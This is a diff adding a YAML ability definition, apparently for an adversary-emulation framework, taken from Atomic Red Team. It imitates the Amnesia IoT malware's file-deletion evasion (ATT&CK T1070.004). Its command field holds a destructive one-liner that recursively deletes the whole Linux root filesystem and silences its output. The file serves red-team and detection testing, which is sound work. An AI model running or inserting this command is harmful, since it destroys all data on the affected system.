@@ -1,0 +1,28 @@
+- id: f3aa95fe-4f10-4485-ad26-abf22a764c52
+  name: Delete Filesystem - Linux
+  description: This test deletes the entire root filesystem of a Linux system. This
+    technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous
+    and destructive, do NOT use on production equipment.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.004
+    name: 'Indicator Removal on Host: File Deletion'
+  platforms:
+    linux:
+      sh:
+        command: '[ "$(uname)" = ''Linux'' ] && rm -rf / --no-preserve-root > /dev/null
+          2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - defense-evasion
+  - atomic-red-team
+  - t1070.004
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-01-31T12:35:36.479Z'
+    atomic_guid: f3aa95fe-4f10-4485-ad26-abf22a764c52
+    import_timestamp: '2025-06-24T11:15:55.784168Z'
